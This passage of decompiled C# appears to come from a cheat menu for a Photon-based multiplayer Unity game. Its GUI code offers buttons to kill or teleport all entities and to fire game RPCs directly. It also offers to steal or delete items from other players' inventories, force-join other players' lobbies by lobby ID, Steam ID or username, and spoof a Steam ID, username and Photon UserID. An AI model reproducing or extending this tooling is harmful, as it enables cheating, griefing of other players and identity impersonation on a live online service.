												Debug.LogWarning((object)("[GUI] Error processing AI component: " + ex9.Message));
											}
										}
									}
									else
									{
										GUILayout.Label("No AI components found", new GUIStyle(GUI.labelStyle)
										{
											fontSize = 11
										}, Array.Empty<GUILayoutOption>());
									}
								}
								catch (Exception ex10)
								{
									Debug.LogWarning((object)("[GUI] Error getting AI components: " + ex10.Message));
									GUILayout.Label("Error loading AI components", new GUIStyle(GUI.labelStyle)
									{
										fontSize = 11
									}, Array.Empty<GUILayoutOption>());
								}
								GUILayout.Space(4f);
								if (GUILayout.Button("Reinitialize Entity", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
								{
									try
									{
										GUI.InitializeSpawnedEntity(val2);
									}
									catch (Exception ex11)
									{
										Debug.LogError((object)("[GUI] Error reinitializing entity: " + ex11.Message));
									}
								}
								GUIHelpers.EndCollapsibleSection();
							}
							GUILayout.Space(4f);
							if (flag2)
							{
								GUILayout.Label("Movement Controls:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
								GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
								GUILayout.Label("Speed:", (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(60f) });
								GUI.entityControlSpeed = GUILayout.HorizontalSlider(GUI.entityControlSpeed, 1f, 20f, Array.Empty<GUILayoutOption>());
								GUILayout.Label(GUI.entityControlSpeed.ToString("F1"), (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(40f) });
								GUILayout.EndHorizontal();
								GUILayout.Space(4f);
								GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
								if (GUILayout.Button("Move Forward", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(34f) }))
								{
									GUI.MoveEntity(val2, Vector3.forward);
								}
								if (GUILayout.Button("Move Back", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(34f) }))
								{
									GUI.MoveEntity(val2, Vector3.back);
								}
								GUILayout.EndHorizontal();
								GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
								if (GUILayout.Button("Move Left", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(34f) }))
								{
									GUI.MoveEntity(val2, Vector3.left);
								}
								if (GUILayout.Button("Move Right", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(34f) }))
								{
									GUI.MoveEntity(val2, Vector3.right);
								}
								GUILayout.EndHorizontal();
								GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
								if (GUILayout.Button("Jump", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(34f) }))
								{
									GUI.MakeEntityJump(val2);
								}
								if (GUILayout.Button("Stop", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(34f) }))
								{
									GUI.StopEntity(val2);
								}
								GUILayout.EndHorizontal();
							}
							GUILayout.Space(4f);
							GUILayout.Label("Teleport to Player:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
							if (GUI.playerDict != null && GUI.playerDict.Count > 0)
							{
								string[] array2 = GUI.playerDict.Keys.ToArray();
								int num4 = GUILayout.SelectionGrid(-1, array2, 2, GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) });
								if (num4 >= 0 && num4 < array2.Length)
								{
									Character val4 = GUI.playerDict[array2[num4]];
									if (val4 != null)
									{
										GUI.TeleportEntityToPlayer(val2, val4);
									}
								}
							}
							else
							{
								GUILayout.Label("No players found", new GUIStyle(GUI.labelStyle)
								{
									fontSize = 11
								}, Array.Empty<GUILayoutOption>());
							}
							GUIHelpers.EndCollapsibleSection();
						}
					}
					catch (Exception ex12)
					{
						Debug.LogError((object)("[GUI] Error in actions section: " + ex12.Message));
						GUIHelpers.EndCollapsibleSection();
					}
				}
				else if (GUIHelpers.DrawCollapsibleSection("NoEntitySelected", "? Actions", (Color?)new Color(0.7f, 0.7f, 0.7f, 1f)))
				{
					GUILayout.Label("Select an entity above to manage it", new GUIStyle(GUI.labelStyle)
					{
						fontSize = 11,
						fontStyle = (FontStyle)2
					}, Array.Empty<GUILayoutOption>());
					GUIHelpers.EndCollapsibleSection();
				}
				if (!GUIHelpers.DrawCollapsibleSection("BulkActions", "? Bulk Actions", Color.white))
				{
					return;
				}
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Kill All", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
				{
					foreach (GameObject item in GUI.GetAllEntitiesInGame())
					{
						if (item != null)
						{
							GUI.KillEntity(item);
						}
					}
					GUI.selectedEntityIndex = -1;
				}
				if (GUILayout.Button("Teleport All to Me", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(36f) }))
				{
					foreach (GameObject item2 in GUI.GetAllEntitiesInGame())
					{
						if (item2 != null)
						{
							GUI.TeleportEntityToMe(item2);
						}
					}
				}
				GUILayout.EndHorizontal();
				GUILayout.Space(4f);
				if (GUILayout.Button("Refresh List", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
				{
					GUI.CleanupDestroyedEntities();
				}
				GUIHelpers.EndCollapsibleSection();
			}
			catch (Exception ex13)
			{
				Debug.LogError((object)("[GUI] Error in DrawEntityManager: " + ex13.Message + "\n" + ex13.StackTrace));
				GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
				GUILayout.Label("Error loading entity manager", new GUIStyle(GUI.labelStyle)
				{
					normal = new GUIStyleState
					{
						textColor = Color.red
					}
				}, Array.Empty<GUILayoutOption>());
				GUILayout.Label("Error: " + ex13.Message, new GUIStyle(GUI.labelStyle)
				{
					fontSize = 10
				}, Array.Empty<GUILayoutOption>());
				GUILayout.EndVertical();
			}
		}
	}
	public static class GUIItemManagement
	{
		public static void Draw()
		{
			if (!GUIHelpers.DrawCollapsibleSection("WorldItems", "? World Items", Color.white))
			{
				return;
			}
			GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
			GUILayout.Button("Refresh Items", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) });
			GUILayout.EndHorizontal();
			GUILayout.Space(5f);
			List<Item> list = (from item in Object.FindObjectsByType<Item>(FindObjectsSortMode.None)
				where item != null && (int)item.itemState == 0
				select item).ToList();
			if (list.Count == 0)
			{
				GUILayout.Label("No items found on the map", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				GUILayout.EndVertical();
				return;
			}
			GUILayout.Label($"Found {list.Count} items", new GUIStyle(GUI.labelStyle)
			{
				fontSize = 11
			}, Array.Empty<GUILayoutOption>());
			GUILayout.Space(5f);
			int num = 8;
			int num2 = Mathf.Min(list.Count, num);
			if (GUI.selectedWorldItemIndex < 0 || GUI.selectedWorldItemIndex >= list.Count)
			{
				GUI.selectedWorldItemIndex = -1;
			}
			for (int i = 0; i < num2; i++)
			{
				Item val = list[i];
				if (!(val == null))
				{
					string name = val.GetName();
					float num3 = ((Character.localCharacter != null) ? Vector3.Distance(Character.localCharacter.Center, val.Center()) : 0f);
					string text = $"{name} ({num3:F1}m)";
					bool flag = GUI.selectedWorldItemIndex == i;
					if (GUILayout.Toggle(flag, text, GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(24f) }))
					{
						GUI.selectedWorldItemIndex = i;
					}
					else if (flag)
					{
						GUI.selectedWorldItemIndex = -1;
					}
				}
			}
			if (list.Count > num)
			{
				GUILayout.Label($"... and {list.Count - num} more items (scroll to see)", new GUIStyle(GUI.labelStyle)
				{
					fontSize = 10,
					normal = new GUIStyleState
					{
						textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
			}
			GUILayout.Space(5f);
			if (GUI.selectedWorldItemIndex >= 0 && GUI.selectedWorldItemIndex < list.Count)
			{
				Item val2 = list[GUI.selectedWorldItemIndex];
				if (val2 != null)
				{
					GUILayout.Label("Selected: " + val2.GetName(), new GUIStyle(GUI.labelStyle)
					{
						fontStyle = FontStyle.Bold
					}, Array.Empty<GUILayoutOption>());
					GUILayout.Space(5f);
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Teleport To Me", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }) && Character.localCharacter != null)
					{
						Vector3 val3 = Character.localCharacter.Center + Vector3.up * 2f;
						val2.photonView.RPC("SetKinematicRPC", RpcTarget.AllBuffered, new object[3]
						{
							true,
							val3,
							Quaternion.identity
						});
					}
					if (GUILayout.Button("Launch Up", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }) && val2.rig != null)
					{
						val2.rig.linearVelocity = Vector3.up * 20f;
					}
					GUILayout.EndHorizontal();
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					if (GUILayout.Button("Cook Item", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
					{
						ItemCooking component = ((Component)val2).GetComponent<ItemCooking>();
						if (component != null && component.canBeCooked && (Object)(object)val2.photonView != (Object)null)
						{
							val2.photonView.RPC("FinishCookingRPC", RpcTarget.All, Array.Empty<object>());
						}
					}
					if (GUILayout.Button("Delete Item", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }) && (Object)(object)val2.photonView != (Object)null && (val2.photonView.IsMine || PhotonNetwork.IsMasterClient))
					{
						PhotonNetwork.Destroy(val2.gameObject);
					}
					GUILayout.EndHorizontal();
				}
			}
			else
			{
				GUILayout.Label("Select an item above", new GUIStyle(GUI.labelStyle)
				{
					fontSize = 11,
					normal = new GUIStyleState
					{
						textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
			}
			GUIHelpers.EndCollapsibleSection();
		}
	}
	public static class GUIPlayerManagement
	{
		public static void DrawInventoryManagement()
		{
			if (!GUIHelpers.DrawCollapsibleSection("InventoryManagement", "? Inventory Management", Color.white))
			{
				return;
			}
			Character val = null;
			if (GUI.playerDict != null && GUI.playerDict.Count > 0 && GUI.selectedPlayerIndex >= 0 && GUI.selectedPlayerIndex < GUI.playerDict.Keys.Count)
			{
				string[] array = GUI.playerDict.Keys.ToArray();
				val = GUI.playerDict[array[GUI.selectedPlayerIndex]];
			}
			if (val == null || val.player == null)
			{
				GUILayout.Label("Select a player to view inventory", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				GUILayout.EndVertical();
				return;
			}
			GUILayout.Label("Viewing: " + GUI.playerDict.Keys.ToArray()[GUI.selectedPlayerIndex], new GUIStyle(GUI.labelStyle)
			{
				fontStyle = FontStyle.Bold
			}, Array.Empty<GUILayoutOption>());
			GUILayout.Space(5f);
			float num = Mathf.Min(GUIHelpers.GetScrollViewHeight() - 150f, 300f);
			num = Mathf.Max(num, 150f);
			GUI.inventoryScrollPos = GUILayout.BeginScrollView(GUI.inventoryScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(num) });
			for (byte b = 0; b < 3; b++)
			{
				ItemSlot itemSlot = val.player.GetItemSlot(b);
				string text = $"Slot {b}: ";
				text = ((!itemSlot.IsEmpty()) ? (text + ((itemSlot.prefab != null) ? itemSlot.prefab.GetName() : "Unknown Item")) : (text + "Empty"));
				bool flag = GUI.selectedInventorySlotIndex == b;
				if (GUILayout.Toggle(flag, text, GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
				{
					GUI.selectedInventorySlotIndex = b;
				}
				else if (flag)
				{
					GUI.selectedInventorySlotIndex = -1;
				}
			}
			try
			{
				ItemSlot itemSlot2 = val.player.GetItemSlot((byte)3);
				string text2 = "Backpack: ";
				text2 = (itemSlot2.IsEmpty() ? (text2 + "Empty") : ((!(itemSlot2.prefab != null)) ? (text2 + "Backpack") : (text2 + itemSlot2.prefab.GetName())));
				bool flag2 = GUI.selectedInventorySlotIndex == 3;
				if (GUILayout.Toggle(flag2, text2, GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
				{
					GUI.selectedInventorySlotIndex = 3;
				}
				else if (flag2)
				{
					GUI.selectedInventorySlotIndex = -1;
				}
				if (!itemSlot2.IsEmpty() && ((ItemSlot)val.player.backpackSlot).data != null)
				{
					try
					{
						MethodInfo method = typeof(ItemInstanceData).GetMethod("TryGetDataEntry", BindingFlags.Instance | BindingFlags.Public);
						if (method != null)
						{
							object obj = Enum.Parse(typeof(DataEntryKey), "BackpackData");
							MethodInfo methodInfo = method.MakeGenericMethod(typeof(BackpackData));
							object[] array2 = new object[2] { obj, null };
							if ((bool)methodInfo.Invoke(((ItemSlot)val.player.backpackSlot).data, array2) && array2[1] != null)
							{
								object obj2 = array2[1];
								BackpackData val2 = (BackpackData)((obj2 is BackpackData) ? obj2 : null);
								if (val2 != null && val2.itemSlots != null)
								{
									GUILayout.Space(3f);
									GUILayout.Label("  Contents:", new GUIStyle(GUI.labelStyle)
									{
										fontSize = 11,
										normal = new GUIStyleState
										{
											textColor = new Color(0.7f, 0.9f, 1f, 1f)
										}
									}, Array.Empty<GUILayoutOption>());
									for (int i = 0; i < val2.itemSlots.Length; i++)
									{
										ItemSlot val3 = val2.itemSlots[i];
										if (!val3.IsEmpty())
										{
											string arg = ((val3.prefab != null) ? val3.prefab.GetName() : "Unknown");
											GUILayout.Label($"    Slot {i}: {arg}", new GUIStyle(GUI.labelStyle)
											{
												fontSize = 10,
												normal = new GUIStyleState
												{
													textColor = new Color(0.8f, 0.8f, 0.8f, 1f)
												}
											}, Array.Empty<GUILayoutOption>());
										}
									}
								}
							}
						}
					}
					catch
					{
					}
				}
			}
			catch (Exception ex)
			{
				GUILayout.Label("Backpack: Error (" + ex.Message + ")", GUI.labelStyle, Array.Empty<GUILayoutOption>());
			}
			ItemSlot itemSlot3 = val.player.GetItemSlot((byte)250);
			string text3 = "Temp Slot: ";
			text3 = ((!itemSlot3.IsEmpty()) ? (text3 + ((itemSlot3.prefab != null) ? itemSlot3.prefab.GetName() : "Unknown Item")) : (text3 + "Empty"));
			bool flag3 = GUI.selectedInventorySlotIndex == 250;
			if (GUILayout.Toggle(flag3, text3, GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
			{
				GUI.selectedInventorySlotIndex = 250;
			}
			else if (flag3)
			{
				GUI.selectedInventorySlotIndex = -1;
			}
			GUILayout.EndScrollView();
			GUILayout.Space(5f);
			if (GUI.selectedInventorySlotIndex >= 0)
			{
				try
				{
					byte b2 = (byte)((GUI.selectedInventorySlotIndex == 250) ? 250u : ((uint)GUI.selectedInventorySlotIndex));
					ItemSlot itemSlot4 = val.player.GetItemSlot(b2);
					if (!itemSlot4.IsEmpty())
					{
						string text4 = "Unknown Item";
						if (itemSlot4.prefab != null)
						{
							text4 = itemSlot4.prefab.GetName();
						}
						else if (b2 == 3)
						{
							text4 = "Backpack";
						}
						GUILayout.Label("Selected: " + text4, new GUIStyle(GUI.labelStyle)
						{
							fontStyle = FontStyle.Bold
						}, Array.Empty<GUILayoutOption>());
						GUILayout.Space(5f);
						GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
						if (GUILayout.Button("Drop Item", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
						{
							GUI.DropItemFromPlayer(val, b2);
							GUI.selectedInventorySlotIndex = -1;
						}
						if (GUILayout.Button("Steal Item", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
						{
							GUI.StealItemFromPlayer(val, b2);
							GUI.selectedInventorySlotIndex = -1;
						}
						GUILayout.EndHorizontal();
						GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
						if (GUILayout.Button("Delete Item", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
						{
							val.player.EmptySlot(Optionable<byte>.Some(b2));
							GUI.selectedInventorySlotIndex = -1;
						}
						if (GUILayout.Button("Cook Item", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) }))
						{
							GUI.CookPlayerItem(val, b2);
						}
						GUILayout.EndHorizontal();
					}
				}
				catch (Exception ex2)
				{
					GUILayout.Label("Error: " + ex2.Message, new GUIStyle(GUI.labelStyle)
					{
						normal = new GUIStyleState
						{
							textColor = new Color(1f, 0.4f, 0.4f, 1f)
						}
					}, Array.Empty<GUILayoutOption>());
				}
			}
			else
			{
				GUILayout.Label("Select an item slot above", new GUIStyle(GUI.labelStyle)
				{
					fontSize = 11,
					normal = new GUIStyleState
					{
						textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
					}
				}, Array.Empty<GUILayoutOption>());
			}
			GUIHelpers.EndCollapsibleSection();
		}
	}
	public static class GUINetworkTab
	{
		public static void Draw()
		{
			if (GUIHelpers.DrawCollapsibleSection("ConnectionControl", "? Connection Control", Color.white))
			{
				GUILayout.Label("Current Status:", new GUIStyle(GUI.labelStyle)
				{
					fontSize = 10,
					fontStyle = FontStyle.Bold
				}, Array.Empty<GUILayoutOption>());
				if (PhotonNetwork.IsConnected)
				{
					if (PhotonNetwork.InRoom)
					{
						GUILayout.Label("Connected to Photon Room: " + PhotonNetwork.CurrentRoom.Name, new GUIStyle(GUI.labelStyle)
						{
							fontSize = 10,
							normal = new GUIStyleState
							{
								textColor = new Color(0.4f, 1f, 0.6f, 1f)
							}
						}, Array.Empty<GUILayoutOption>());
						GUILayout.Label($"Players in room: {PhotonNetwork.CurrentRoom.PlayerCount}/{PhotonNetwork.CurrentRoom.MaxPlayers}", new GUIStyle(GUI.labelStyle)
						{
							fontSize = 9,
							normal = new GUIStyleState
							{
								textColor = new Color(0.7f, 0.9f, 1f, 1f)
							}
						}, Array.Empty<GUILayoutOption>());
					}
					else
					{
						GUILayout.Label("Connected to Photon but not in a room", new GUIStyle(GUI.labelStyle)
						{
							fontSize = 10,
							normal = new GUIStyleState
							{
								textColor = new Color(0.8f, 0.8f, 0.4f, 1f)
							}
						}, Array.Empty<GUILayoutOption>());
					}
				}
				else
				{
					GUILayout.Label("Not connected to Photon", new GUIStyle(GUI.labelStyle)
					{
						fontSize = 10,
						normal = new GUIStyleState
						{
							textColor = new Color(1f, 0.4f, 0.4f, 1f)
						}
					}, Array.Empty<GUILayoutOption>());
				}
				GUILayout.Space(8f);
				GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
				if (GUILayout.Button("Disconnect from Room", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					try
					{
						if (PhotonNetwork.InRoom)
						{
							PhotonNetwork.LeaveRoom(true);
						}
					}
					catch
					{
					}
				}
				if (GUILayout.Button("Disconnect from Photon", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					try
					{
						if (PhotonNetwork.IsConnected)
						{
							PhotonNetwork.Disconnect();
						}
					}
					catch
					{
					}
				}
				GUILayout.EndHorizontal();
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("ForceJoinLobby", "? Force Join Lobby", Color.white))
			{
				ulong currentLobbyID = LobbyJoiner.GetCurrentLobbyID();
				if (currentLobbyID != 0L)
				{
					GUILayout.Label($"Current Lobby ID: {currentLobbyID}", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				}
				else
				{
					GUILayout.Label("Not in a lobby", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				}
				GUILayout.Space(6f);
				if (GUILayout.Button("Join Current Lobby", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					try
					{
						ulong currentLobbyID2 = LobbyJoiner.GetCurrentLobbyID();
						if (currentLobbyID2 != 0L)
						{
							LobbyJoiner.JoinLobbyByID(currentLobbyID2);
						}
						else
						{
							Debug.LogError((object)"[GUI] No current lobby ID available");
						}
					}
					catch (Exception ex)
					{
						Debug.LogError((object)("[GUI] Failed to join current lobby: " + ex.Message));
					}
				}
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("JoinByLobbyID", "? Join by Lobby ID", Color.white))
			{
				GUILayout.Label("Lobby ID:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				GUI.lobbyIDInput = GUILayout.TextField(GUI.lobbyIDInput, GUI.textFieldStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) });
				GUILayout.Space(4f);
				if (GUILayout.Button("Join Lobby", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					try
					{
						if (ulong.TryParse(GUI.lobbyIDInput, out var result))
						{
							LobbyJoiner.JoinLobbyByID(result);
						}
						else
						{
							Debug.LogError((object)"[GUI] Invalid lobby ID format");
						}
					}
					catch (Exception ex2)
					{
						Debug.LogError((object)("[GUI] Failed to join lobby by ID: " + ex2.Message));
					}
				}
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("JoinByPlayerSteamID", "? Join by Player Steam ID", Color.white))
			{
				GUILayout.Label("Player Steam ID:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				GUI.playerSteamIDInput = GUILayout.TextField(GUI.playerSteamIDInput, GUI.textFieldStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) });
				GUILayout.Space(4f);
				if (GUILayout.Button("Join Player's Lobby", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					try
					{
						if (ulong.TryParse(GUI.playerSteamIDInput, out var result2))
						{
							LobbyJoiner.JoinLobbyByPlayerSteamID(result2);
						}
						else
						{
							Debug.LogError((object)"[GUI] Invalid Steam ID format");
						}
					}
					catch (Exception ex3)
					{
						Debug.LogError((object)("[GUI] Failed to join lobby by Steam ID: " + ex3.Message));
					}
				}
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("BrowseAllLobbies", "? Browse All Lobbies", Color.white))
			{
				if (GUILayout.Button("Refresh Lobbies", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					try
					{
						LobbyJoiner.GetAllLobbies();
					}
					catch (Exception ex4)
					{
						Debug.LogError((object)("[GUI] Failed to refresh lobbies: " + ex4.Message));
					}
				}
				List<LobbyJoiner.JoinableLobbyInfo> joinableLobbies = LobbyJoiner.JoinableLobbies;
				if (joinableLobbies != null && joinableLobbies.Count > 0)
				{
					GUILayout.Space(4f);
					float num = Mathf.Min((float)joinableLobbies.Count * 32f + 10f, 300f);
					GUI.searchResultsScrollPos = GUILayout.BeginScrollView(GUI.searchResultsScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(num) });
					foreach (LobbyJoiner.JoinableLobbyInfo item in joinableLobbies)
					{
						GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
						GUILayout.Label($"Lobby {item.lobbyID} ({item.currentPlayers}/{item.maxPlayers} players)", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.ExpandWidth(true) });
						if (GUILayout.Button("Join", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
						{
							GUILayout.Width(60f),
							GUILayout.Height(28f)
						}))
						{
							try
							{
								LobbyJoiner.JoinLobbyByID(item.lobbyID);
							}
							catch (Exception ex5)
							{
								Debug.LogError((object)("[GUI] Failed to join lobby: " + ex5.Message));
							}
						}
						GUILayout.EndHorizontal();
					}
					GUILayout.EndScrollView();
				}
				else
				{
					GUILayout.Label("No lobbies found. Click Refresh to search.", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				}
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("SearchLobbiesByUsername", "? Search Lobbies by Username", Color.white))
			{
				GUILayout.Label("Username:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
				GUI.usernameSearchInput = GUILayout.TextField(GUI.usernameSearchInput, GUI.textFieldStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(28f) });
				GUILayout.Space(4f);
				if (GUILayout.Button("Search", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(32f) }))
				{
					try
					{
						LobbyJoiner.SearchLobbiesByUsername(GUI.usernameSearchInput);
					}
					catch (Exception ex6)
					{
						Debug.LogError((object)("[GUI] Failed to search lobbies: " + ex6.Message));
					}
				}
				List<LobbyJoiner.LobbySearchResult> searchResults = LobbyJoiner.SearchResults;
				if (searchResults != null && searchResults.Count > 0)
				{
					GUILayout.Space(4f);
					float num2 = Mathf.Min((float)searchResults.Count * 32f + 10f, 200f);
					GUI.searchResultsScrollPos = GUILayout.BeginScrollView(GUI.searchResultsScrollPos, false, true, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Height(num2) });
					foreach (LobbyJoiner.LobbySearchResult item2 in searchResults)
					{
						GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
						GUILayout.Label($"Lobby {item2.lobbyID} - {item2.hostName} ({item2.memberCount} players)", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.ExpandWidth(true) });
						if (GUILayout.Button("Join", GUI.buttonStyle, (GUILayoutOption[])(object)new GUILayoutOption[2]
						{
							GUILayout.Width(60f),
							GUILayout.Height(28f)
						}))
						{
							try
							{
								LobbyJoiner.JoinLobbyByID(item2.lobbyID);
							}
							catch (Exception ex7)
							{
								Debug.LogError((object)("[GUI] Failed to join lobby: " + ex7.Message));
							}
						}
						GUILayout.EndHorizontal();
					}
					GUILayout.EndScrollView();
				}
				GUIHelpers.EndCollapsibleSection();
			}
			if (GUIHelpers.DrawCollapsibleSection("SteamSpoofing", "? Steam ID & Username Spoofing", Color.white))
			{
				SteamSpoofing.SpoofEnabled = GUIHelpers.DrawToggleButton(SteamSpoofing.SpoofEnabled, "Enable Steam Spoofing");
				if (SteamSpoofing.SpoofEnabled)
				{
					GUILayout.Space(4f);
					GUILayout.Label("Steam ID:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
					ulong currentSteamID = SteamSpoofing.GetCurrentSteamID();
					string text = ((currentSteamID != 0L) ? currentSteamID.ToString() : "Not set");
					GUILayout.Label("Current: " + text, new GUIStyle(GUI.labelStyle)
					{
						fontSize = 10,
						normal = new GUIStyleState
						{
							textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
						}
					}, Array.Empty<GUILayoutOption>());
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("New Steam ID:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
					if (ulong.TryParse(GUILayout.TextField(SteamSpoofing.SpoofedSteamID.ToString(), GUI.textFieldStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.ExpandWidth(true) }), out var result3) && result3 != SteamSpoofing.SpoofedSteamID)
					{
						SteamSpoofing.SetSpoofedSteamID(result3);
					}
					GUILayout.EndHorizontal();
					GUILayout.Space(4f);
					GUILayout.Label("Username:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
					string text2 = SteamSpoofing.GetCurrentUsername() ?? "Not set";
					GUILayout.Label("Current: " + text2, new GUIStyle(GUI.labelStyle)
					{
						fontSize = 10,
						normal = new GUIStyleState
						{
							textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
						}
					}, Array.Empty<GUILayoutOption>());
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("New Username:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
					string text3 = GUILayout.TextField(SteamSpoofing.SpoofedUsername, GUI.textFieldStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.ExpandWidth(true) });
					if (text3 != SteamSpoofing.SpoofedUsername)
					{
						SteamSpoofing.SetSpoofedUsername(text3);
					}
					GUILayout.EndHorizontal();
					GUILayout.Space(4f);
					GUILayout.Label("Photon UserID:", GUI.labelStyle, Array.Empty<GUILayoutOption>());
					string text4 = SteamSpoofing.GetCurrentPhotonUserID() ?? "Not set";
					GUILayout.Label("Current: " + text4, new GUIStyle(GUI.labelStyle)
					{
						fontSize = 10,
						normal = new GUIStyleState
						{
							textColor = new Color(0.7f, 0.7f, 0.7f, 1f)
						}
					}, Array.Empty<GUILayoutOption>());
					GUILayout.BeginHorizontal(Array.Empty<GUILayoutOption>());
					GUILayout.Label("New Photon ID:", GUI.labelStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.Width(120f) });
					string text5 = GUILayout.TextField(SteamSpoofing.SpoofedPhotonUserID, GUI.textFieldStyle, (GUILayoutOption[])(object)new GUILayoutOption[1] { GUILayout.ExpandWidth(true) });
					if (text5 != SteamSpoofing.SpoofedPhotonUserID)
					{
						SteamSpoofing.SetSpoofedPhotonUserID(text5);
					}
					GUILayout.EndHorizontal();
				}
				GUIHelpers.EndCollapsibleSection();
			}
